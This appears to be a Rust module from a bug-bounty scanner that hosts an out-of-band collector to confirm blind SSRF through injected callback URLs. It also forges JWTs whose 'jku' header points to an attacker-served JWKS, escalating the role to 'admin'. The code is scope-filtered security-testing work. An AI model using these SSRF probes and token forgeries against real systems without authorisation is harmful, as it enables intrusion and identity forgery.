// SPDX-License-Identifier: LicenseRef-Propietario
//! Verificación SSRF OUT-OF-BAND con colector AUTO-HOSPEDADO (fase 3.1, capa 2).
//!
//! La detección in-band (`ssrf.rs`) solo ve el SSRF cuya metadata VUELVE en la
//! respuesta. El SSRF CIEGO —el servidor hace la petición pero no refleja nada—
//! se caza out-of-band: se inyecta una URL única `http://<colector>/<token>` en
//! los parámetros del objetivo; si el servidor del objetivo la TRAE, nuestro
//! colector registra el hit y la sonda lo confirma consultando la BD compartida.
//!
//! **Auto-hospedado, sin terceros ni DNS** (decisión 2026-08-23): el payload usa
//! la IP CRUDA del VPS que ya controlamos (`http://<ip>:<puerto>/<token>`), así
//! que no se manda la interacción del objetivo a un interactsh público (choca con
//! la postura solo-local) ni se necesita un comodín DNS (que exigiría acceso al
//! registrador). Todo vive en el VPS: el colector (`nexus oob-server`) y `nexus`
//! comparten la misma SQLite en WAL —uno escribe el hit, el otro lo consulta—.
//!
//! **Prueba determinista, no heurística:** un token aleatorio de 16 chars solo lo
//! puede pegar algo que recibió NUESTRO payload exacto. Nadie lo adivina
//! (36^16 ≈ 8·10^24), así que un hit NO es ruido —a diferencia del timing de
//! smuggling— y basta uno para confirmar (directiva 30: el positivo de control es
//! el propio callback).
//!
//! **Límite honesto (directiva 16, para no vender de más):** esto caza el SSRF que
//! hace *fetch* HTTP a la URL inyectada —la mayoría reportable—. El SSRF que solo
//! RESUELVE DNS sin traer la URL no deja hit HTTP; cazarlo pediría un servidor DNS
//! propio (más superficie en producción), que queda para una fase futura.

use axum::{
    extract::{ConnectInfo, Request, State},
    response::{IntoResponse, Response},
    Router,
};
use sqlx::SqlitePool;
use std::net::SocketAddr;
use std::time::Duration;

/// Longitud del token. 16 chars base36 = 36^16 ≈ 8·10^24 combinaciones.
pub const TOKEN_LEN: usize = 16;
const ALFABETO: &[u8] = b"abcdefghijklmnopqrstuvwxyz0123456789";

/// Genera un token único e impredecible para una sonda OOB.
pub fn token() -> String {
    use rand::Rng;
    let mut r = rand::rng();
    (0..TOKEN_LEN)
        .map(|_| ALFABETO[r.random_range(0..ALFABETO.len())] as char)
        .collect()
}

/// Extrae el token del PATH de un callback (`/<token>` o `/<token>/lo-que-sea`).
/// PURO. Devuelve `Some` solo si el primer segmento tiene la forma exacta de un
/// token (longitud + charset), para no registrar como token cualquier ruido que
/// llegue al puerto público. `hit_exists` casa exacto, así que esto es un filtro
/// de higiene, no la barrera de seguridad (esa es la impredecibilidad del token).
pub fn extraer_token(path: &str) -> Option<String> {
    let seg = path.trim_start_matches('/').split('/').next().unwrap_or("");
    if seg.len() == TOKEN_LEN && seg.bytes().all(|b| ALFABETO.contains(&b)) {
        Some(seg.to_string())
    } else {
        None
    }
}

/// Handler catch-all del colector: registra el hit y responde 200 mínimo. No
/// expone nada de la BD; solo escribe. Un error de escritura no tumba el puerto
/// público (se traga y sigue).
async fn recibir(
    State(pool): State<SqlitePool>,
    ConnectInfo(addr): ConnectInfo<SocketAddr>,
    req: Request,
) -> Response {
    let method = req.method().as_str().to_string();
    let path = req.uri().path().to_string();
    let ua = req
        .headers()
        .get("user-agent")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("")
        .to_string();
    let ip = addr.ip().to_string();
    if let Some(tok) = extraer_token(&path) {
        if let Err(e) = crate::db::record_oob_hit(&pool, &tok, &ip, &method, &path, &ua).await {
            tracing::warn!("oob: no se pudo registrar el hit de {tok}: {e}");
        } else {
            tracing::info!("oob: callback de {ip} para token {tok} ({method} {path})");
        }
    }
    // Si el callback pide un JWKS (molde `JkuAtacante`: el objetivo trae `jku` para SACAR la
    // clave de verificación), SERVIMOS la pubkey RSA del atacante — así el server verifica el
    // RS256 que firmamos y la forja se ACEPTA. Cualquier otra ruta: 200 mínimo (basta para que
    // el FETCH quede registrado, que es lo que confirma `JkuSsrf`).
    if path.contains("jwks") {
        return (
            [(axum::http::header::CONTENT_TYPE, "application/json")],
            crate::autenticacion::jwks_atacante_json(),
        )
            .into_response();
    }
    "ok".into_response()
}

/// Router del colector: cualquier método y cualquier ruta caen en `recibir`
/// (`fallback` captura todo método y toda ruta no enrutada).
pub fn router(pool: SqlitePool) -> Router {
    Router::new().fallback(recibir).with_state(pool)
}

/// Fase SSRF OUT-OF-BAND. Complementa a `ssrf::fase_ssrf` (in-band) cazando el
/// SSRF CIEGO: inyecta un callback único por URL y confirma por hit en la BD.
///
/// `urls_param` llega ya filtrado por alcance (de `targets.txt`, que pasa por
/// `filter_to_scope`), igual que la fase in-band. Todo por GET, sin daño.
///
/// El hallazgo se persiste como `ssrf-oob-callback` (severity **medium**) por la
/// vía NORMAL (`insert_finding_dedup`, NO auto-confirmado): un SSRF CIEGO solo
/// prueba interacción EXTERNA (el servidor trae una URL arbitraria); el impacto
/// alto —acceso interno/metadata— NO está demostrado y se confirma a mano. Medium
/// es la severidad honesta que un triager no baja (sobre-vender un blind como
/// critical quema Signal); escala al confirmar destino interno. Pasa por revisión
/// humana antes de enviarse. El valor está en que NADIE lo veía antes.
/// `pool` = BD principal (findings/programas). `oob_pool` = BD AISLADA del
/// colector (solo `oob_hits`), que es donde consultamos los callbacks — el
/// escritor público nunca toca la BD principal.
#[allow(clippy::too_many_arguments)]
pub async fn fase_ssrf_oob(
    pool: &SqlitePool,
    oob_pool: &SqlitePool,
    program: &str,
    urls_param: &[String],
    max: usize,
    oob_base: &str,
    wait_secs: u64,
    webhook: Option<&str>,
) -> anyhow::Result<usize> {
    let cliente = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(std::time::Duration::from_secs(12))
        .user_agent(crate::evasion::UA_POOL[0])
        .build()?;
    let program_id = crate::db::upsert_program(pool, program).await?;
    let base = oob_base.trim_end_matches('/');
    // Housekeeping del lado hunt: borra callbacks de >24h (el colector también lo
    // hace; aquí cubre el caso de que el colector lleve mucho sin reiniciarse).
    let _ = crate::db::purge_oob_hits_older_than(oob_pool, 24).await;
    // Marca de agua ANTES de inyectar: solo cuentan los callbacks posteriores.
    let since_id = crate::db::max_oob_id(oob_pool).await?;

    // Pasada 1: inyectar un callback ÚNICO por URL objetivo y dispararlo.
    let mut pendientes: Vec<(String, String)> = Vec::new(); // (token, url_objetivo)
    for url in urls_param.iter().take(max) {
        let tok = token();
        let payload = format!("{base}/{tok}");
        let variantes = crate::ssrf::inyectar_en_parametros(url, &payload);
        if variantes.is_empty() {
            continue;
        }
        for variante in &variantes {
            // La respuesta no importa: lo que confirma es el callback saliente.
            let _ = cliente.get(variante).send().await;
        }
        pendientes.push((tok, url.clone()));
    }
    if pendientes.is_empty() {
        // Observabilidad (directiva 30): decir por qué NO hay hits, para que
        // "corrió sin URLs parametrizadas" no se confunda con "no corrió".
        tracing::info!("ssrf-oob: {program} sin URLs parametrizadas — nada que inyectar");
        return Ok(0);
    }
    tracing::info!(
        "ssrf-oob: {} callback(s) inyectado(s) en {program}, esperando {}s el retorno",
        pendientes.len(),
        wait_secs.min(60)
    );

    // Espera de gracia ACOTADA (directiva 39): un servidor vulnerable puede tardar
    // en hacer la petición saliente. Quien la hace verdadera es el propio objetivo;
    // el tope evita colgarse si nunca llega. Una sola espera para todo el lote.
    tokio::time::sleep(std::time::Duration::from_secs(wait_secs.min(60))).await;

    // Pasada 2: ¿llegó el callback de cada token?
    let mut n = 0usize;
    for (tok, url) in &pendientes {
        if crate::db::oob_hit_exists(oob_pool, tok, since_id).await? {
            // CANDADO (revisión 2026-08-23, obs 4): la evidencia se teje SOLO con
            // datos controlados por nexus —`tok` que generamos y `url` de
            // targets.txt—, NUNCA con las columnas que el atacante escribió en el
            // colector (source_ip/user_agent/path). Eso es lo que cierra la
            // inyección de segundo orden en el reporte. Si algún día se quiere
            // enriquecer con la IP/UA del callback, ESE dato es hostil y hay que
            // escaparlo antes de meterlo aquí.
            let nf = crate::db::NewFinding {
                program_name: program.to_string(),
                vuln_name: "ssrf-oob-callback".to_string(),
                severity: "medium".to_string(), // blind SSRF: interacción externa probada; escala a mano
                url: url.clone(),
                cwe: Some("CWE-918".to_string()),
                evidencia: Some(format!(
                    "SSRF ciego confirmado OUT-OF-BAND: el servidor de {url} hizo una petición saliente a nuestro colector controlado (token único {tok}). Un token aleatorio de {TOKEN_LEN} chars solo lo pega algo que recibió el payload inyectado → prueba determinista de que el backend trae URLs arbitrarias. Impacto según programa; requiere confirmar destino interno."
                )),
            };
            if crate::db::insert_finding_dedup(pool, &nf, program_id).await? {
                n += 1;
                let _ = crate::notify::notificar(
                    webhook,
                    &crate::notify::Evento::Hallazgos(vec![crate::notify::HallazgoBreve {
                        severity: "medium".into(),
                        vuln_type: "ssrf-oob-callback".into(),
                        url: url.clone(),
                        program_name: program.to_string(),
                    }]),
                )
                .await;
            }
        }
    }
    tracing::info!(
        "ssrf-oob: {program} → {n} SSRF ciego(s) confirmado(s) de {} sondeados",
        pendientes.len()
    );
    Ok(n)
}

/// Fase JWT OUT-OF-BAND: confirma EN VIVO los moldes `jku` que la fase de aceptación no puede
/// (su oráculo es el callback, no el 401-vs-forjado). Por cada (JWT de muestra × endpoint)
/// inyecta DOS sondas con `jku` único apuntando a nuestro colector:
///   - **JkuSsrf**: firma ORIGINAL, `jku`→`/<tok>/.well-known/jwks.json`. Si el server lo trae,
///     confía en una URL de clave ARBITRARIA (CWE-918 + CWE-347): confirmado por el hit.
///   - **JkuAtacante**: RS256 con NUESTRA clave + payload escalado, `jku`→nuestro JWKS. El
///     colector SIRVE la clave; si el server la trae y verifica, acepta la identidad forjada.
///     El hit prueba el fetch de NUESTRO JWKS; el status 2xx observado eleva a bypass.
///
/// GET no destructivo con token de prueba propio (estatuto detector). Hallazgo MANUAL_READY por
/// la vía normal (`insert_finding_dedup`), nunca auto-envío. `oob_pool` = BD AISLADA del colector.
#[allow(clippy::too_many_arguments)]
pub async fn fase_jwt_oob(
    pool: &SqlitePool,
    oob_pool: &SqlitePool,
    program: &str,
    endpoints: &[String],
    jwt_muestra: &[String],
    max: usize,
    oob_base: &str,
    wait_secs: u64,
    webhook: Option<&str>,
) -> anyhow::Result<usize> {
    use crate::autenticacion::{forjar_jku_atacante, forjar_jku_ssrf, parse_jwt};
    let cliente = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(12))
        .user_agent(crate::evasion::UA_POOL[0])
        .build()?;
    let program_id = crate::db::upsert_program(pool, program).await?;
    let base = oob_base.trim_end_matches('/');
    let _ = crate::db::purge_oob_hits_older_than(oob_pool, 24).await;
    let since_id = crate::db::max_oob_id(oob_pool).await?;

    let muestras: Vec<_> = jwt_muestra.iter().filter_map(|t| parse_jwt(t)).collect();
    if muestras.is_empty() {
        tracing::info!("jwt-oob: {program} sin JWT de muestra parseable — nada que inyectar");
        return Ok(0);
    }

    // Pasada 1: inyectar un callback ÚNICO por (sonda × endpoint) vía Authorization: Bearer.
    // `kind` = qué molde; `status` = respuesta observada (solo importa para JkuAtacante).
    let mut pendientes: Vec<(String, String, &'static str, u16)> = Vec::new();
    let mut enviados = 0usize;
    'lotes: for jwt in &muestras {
        for ep in endpoints {
            if enviados >= max {
                break 'lotes;
            }
            // JkuSsrf (firma original; solo prueba el fetch). La respuesta no importa: confirma el callback.
            let tok_s = token();
            let forjado_s = forjar_jku_ssrf(jwt, &format!("{base}/{tok_s}/.well-known/jwks.json"));
            let _ = cliente.get(ep).header("Authorization", format!("Bearer {forjado_s}")).send().await;
            pendientes.push((tok_s, ep.clone(), "ssrf", 0));
            // JkuAtacante (RS256 con nuestra clave; escala rol; el colector sirve el JWKS). Guarda el status.
            let tok_a = token();
            if let Some(forjado_a) =
                forjar_jku_atacante(jwt, &format!("{base}/{tok_a}/.well-known/jwks.json"), &[("role", serde_json::json!("admin"))])
            {
                let status = cliente
                    .get(ep)
                    .header("Authorization", format!("Bearer {forjado_a}"))
                    .send()
                    .await
                    .map(|r| r.status().as_u16())
                    .unwrap_or(0);
                pendientes.push((tok_a, ep.clone(), "atacante", status));
            }
            enviados += 1;
        }
    }
    tracing::info!(
        "jwt-oob: {} sonda(s) jku inyectada(s) en {program}, esperando {}s el callback",
        pendientes.len(),
        wait_secs.min(60)
    );

    // Espera de gracia ACOTADA (directiva 39): la hace verdadera el objetivo al traer el `jku`.
    tokio::time::sleep(Duration::from_secs(wait_secs.min(60))).await;

    // Pasada 2: ¿llegó el callback de cada token? (prueba determinista: token 36^16).
    let mut n = 0usize;
    for (tok, ep, kind, status) in &pendientes {
        if !crate::db::oob_hit_exists(oob_pool, tok, since_id).await? {
            continue;
        }
        // Evidencia tejida SOLO con datos NUESTROS (tok generado, ep de targets): nunca las
        // columnas que el callback escribió en el colector (candado anti-2º-orden, como ssrf-oob).
        let aceptado = matches!(status, 200..=299);
        let (vuln, sev, evidencia) = match *kind {
            "ssrf" => (
                "jwt-jku-ssrf",
                "high",
                format!(
                    "El verificador JWT de {ep} TRAJO el `jku` del header (token único {tok}) desde nuestro colector controlado: confía en una URL de clave ARBITRARIA. Un atacante hospeda su JWKS y forja cualquier identidad (CWE-347 vía CWE-918). Prueba determinista por callback OOB; GET de solo lectura con token de prueba propio."
                ),
            ),
            _ => (
                "jwt-jku-key-injection",
                if aceptado { "critical" } else { "high" },
                format!(
                    "El verificador JWT de {ep} TRAJO NUESTRO JWKS (token {tok}) apuntado por `jku` y {}. Firmamos un RS256 con nuestra clave y escalamos el rol → forja total de identidad (CWE-347). Prueba por callback OOB al JWKS hospedado{}.",
                    if aceptado { "la respuesta fue 2xx (identidad forjada ACEPTADA)" } else { "la usó para verificar" },
                    if aceptado { format!(" + status {status} observado") } else { String::new() }
                ),
            ),
        };
        let nf = crate::db::NewFinding {
            program_name: program.to_string(),
            vuln_name: vuln.to_string(),
            severity: sev.to_string(),
            url: ep.clone(),
            cwe: Some("CWE-347".to_string()),
            evidencia: Some(evidencia),
        };
        if crate::db::insert_finding_dedup(pool, &nf, program_id).await? {
            n += 1;
            tracing::warn!("jwt-oob: {vuln} ({sev}) confirmado en {ep} por callback {tok}");
            let _ = crate::notify::notificar(
                webhook,
                &crate::notify::Evento::Hallazgos(vec![crate::notify::HallazgoBreve {
                    severity: sev.to_string(),
                    vuln_type: vuln.to_string(),
                    url: ep.clone(),
                    program_name: program.to_string(),
                }]),
            )
            .await;
        }
    }
    tracing::info!("jwt-oob: {program} → {n} hallazgo(s) jku confirmado(s) de {} sondeado(s)", pendientes.len());
    Ok(n)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn token_es_del_largo_y_charset_esperado() {
        let t = token();
        assert_eq!(t.len(), TOKEN_LEN);
        assert!(t.bytes().all(|b| ALFABETO.contains(&b)));
        // Dos tokens seguidos no coinciden (impredecibilidad básica).
        assert_ne!(token(), token());
    }

    #[test]
    fn extraer_token_discrimina() {
        // VERDE: un token válido en el primer segmento, con y sin cola.
        let t = token();
        assert_eq!(extraer_token(&format!("/{t}")).as_deref(), Some(t.as_str()));
        assert_eq!(extraer_token(&format!("/{t}/algo/mas")).as_deref(), Some(t.as_str()));
        // ROJO (pareja, directiva 33): ruido que NO tiene forma de token no se
        // registra como token —ni corto, ni con símbolos, ni la raíz—.
        assert!(extraer_token("/").is_none());
        assert!(extraer_token("/favicon.ico").is_none(), "16? no: y tiene punto");
        assert!(extraer_token("/corto").is_none());
        assert!(extraer_token(&format!("/{}", "A".repeat(TOKEN_LEN))).is_none(), "mayúsculas no están en el alfabeto");
        assert!(extraer_token(&format!("/{}", "-".repeat(TOKEN_LEN))).is_none());
    }
}
